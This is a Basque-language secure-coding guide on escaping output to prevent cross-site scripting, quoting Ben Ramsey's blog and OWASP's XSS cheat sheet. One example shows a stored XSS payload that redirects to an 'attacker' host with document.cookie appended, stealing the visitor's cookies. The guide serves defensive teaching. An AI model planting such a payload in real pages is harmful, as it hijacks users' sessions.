# Ihes irteera

### Azalpena

HTML eta beste web lengoaia batzuek kode egikarigarriarekin nahasten dute edukia. HTML paragrafo bakar batek datuen irudikapen bisuala izan dezake JavaScript egikaritzeko argibideekin batera. HTMLa kargatzean edo APItik datuak itzultzean, gure ustez eduki hutsa denak JavaScript kodea har lezake, nabigatzaileak interpretatu eta egikaritzeko modukoa. Hori gertatzen da, adibidez, erasotzaile batek datu base batean txertatutako edukia kargatzen dugunean, adibidez `<div><script>//kode maltzurra</script></div>`. Hori arindu daiteke arakatzaileari aginduz konfiantzazko datuen zatiak edukitzat soilik tratatzeko eta inoiz ez interpretatzeko. Teknika horri ihes egitea deritzo. Npm liburutegi eta HTML txantiloi motor askok ihes egiteko baliabideak eskaintzen dituzte (adibidez: [escape-html](https://github.com/component/escape-html), [node-esapi](https://github.com/ESAPI/node-esapi))). HTML edukiak ez ezik CSSk eta JavaScriptek ere ihes egin beharko lukete



### Kode adibidea: ez jarri fidagarritasunik gabeko daturik zure HTMLan

```html
<script>...INOIZ EZ JARRI FIDAGARRIA EZ DEN KODEA HEMEN...</script>   zuzenean scriptean

 <!--...INOIZ EZ JARRI FIDAGARRIA EZ DEN KODEA HEMEN...-->             HTML komentario baten barruan

 <div ...INOIZ EZ JARRI FIDAGARRIA EZ DEN KODEA HEMEN...=test />       ezaugarri izen batean

 <INOIZ EZ JARRI FIDAGARRIA EZ DEN KODEA HEMEN... href="/test" />   tag izen batean

 <style>...INOIZ EZ JARRI FIDAGARRIA EZ DEN KODEA HEMEN...</style>   CSSan zuzenean

```

### Kode adibidea: datu base batean txerta daitekeen eduki kaltegarria

```html
<div>
  <b>Komentario bat</b>
  <script>
    window.location='http://attacker/?cookie='+document.cookie
</script>
</div>

```

<br/><br/>

### Blog aipua: "Pertsonaiak interpretatuak izatea nahi ez dugunean"

[benramsey.com](https://benramsey.com/articles/escape-output/) bloga:
> Datuak modu askotara irten daitezke  zure aplikaziotik: web nabigatzaile bati bidalitako HTML moduan, SQL datu basera bidalita, XML RSS irakurgailura bidalita, WML haririk gabeko gailu batera bidalita, etab. Aukerak mugagabeak dira. Horietako bakoitzak bere karaktere bereziak ditu, multzoka jasotzen dituena, eta  jasotako gainerako testu arruntaren aldean desberdin interpretatzen dena. Batzuetan, karaktere berezi horiek bidali nahi ditugu interpretatuak izan ahal izateko (HTML nabigatzaile batera bidalitako HTML etiketak, adibidez); beste batzuetan (erabiltzaileek edo beste iturri batzuek egindako sarreren kasuan), ez dugu nahi karaktere horiek interpretatuak izan daitezen, eta, beraz, ihes egin behar diegu.

> Ihes egiteari kodetzea ere esaten zaio batzuetan: ihes egitea edo kodetzea,  laburbilduz,, datuak egikaritu edo interpretatuko ez diren moduan irudikatzeko prozesua da, alegia. Adibidez, HTMLk honako testu hau letra lodiz idatziko du web nabigatzaile batean `<strong>`etiketek esanahi berezia dutelako:
> ```html
> <strong>Testu hau letra lodiz idatzita dago.<strong>
> ```
>
> Baina, demagun etiketak nabigatzailean kargatu nahi ditudala eta haien interpretazioa ekidin nahi dudala. Orduan, HTMLan esanahi berezia duten parentesi angeluarretatik ihes egin behar dut. Hona hemen ihes egindako HTMLa:
>
> ```html
> &lt;strong&gt;Testu hau letra lodiz idatzita dago.&lt;/strong&gt;`
> ```

<br/><br/>

### Blog aipua:  "OWASPek segurtasunera bideratutako kodeketa liburutegia erabiltzea gomendatzen du"

OWASP [XSS (Cross Site Scripting) Prebentzio tranpa orria](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) bloga:
> "Kodetzaile horiek idaztea ez da oso zaila, baina tranpa ugari daude ezkutuan. Adibidez, Javascripten bezalako lasterbide batzuk" erabiltzeko tentazioa izan dezakezu. Hala ere, balio horiek arriskutsuak dira, eta nabigatzailean habiaratutako analizatzaileek oker interpreta ditzakete. Baliteke  zuri ahaztea ihes egitea ihes pertsonaiarengandik, erasotzaileek erabil dezaketeena neutralizatzeko zure segurtasun ahaleginak. **OWASPek gomendatzen du segurtasunera bideratutako kodeketa liburutegiak erabiltzea, arauak behar bezala ezartzen direla ziurtatzeko**."

<br/><br/>

### Blog aipua: "Ihes sintaxia erabili behar duzu HTML zatian"

OWASP [XSS (Cross Site Scripting) Prebentzio tranpa orria](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet) bloga:
> "Baina HTML entitate kodeketak ez du ondo funtzionatzen `<script>` etiketa baten barruan datu ez fidagarriak jartzen badituzu edozein lekutan, edo onmouseover bezalako gertaeren kudeatzailearen atributu batean edo CSS barruan, edo URL batean. Beraz, toki guztietan HTML entitate kodeketaren bat erabiltzen baduzu ere, ziurrena da XSSen erasoekiko zaurgarria izaten jarraituko duela. Ihes sintaxia erabili behar duzu fidagarriak ez diren datuak jartzen ari zaren HTML dokumentuaren zatian."
